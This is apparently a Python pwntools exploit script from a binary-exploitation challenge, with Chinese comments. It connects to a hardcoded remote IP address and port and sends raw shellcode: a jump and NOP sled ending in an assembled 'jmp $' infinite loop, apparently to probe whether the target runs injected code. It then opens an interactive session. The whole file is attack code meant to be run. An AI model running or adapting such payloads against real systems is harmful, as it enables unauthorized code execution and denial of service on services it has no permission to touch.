from pwn import *

context.arch = 'amd64'
TARGET_IP = '27.25.151.26'
TARGET_PORT = 31548

# 构造死循环payload
payload = b'\xeb\x0e\x90\x90\x00'+b'\x90'*11+asm('jmp $')                 
          

# 直接发送并观察行为
print("[+] Sending deadloop payload")
p = remote(TARGET_IP, TARGET_PORT)
p.send(payload)
p.interactive()
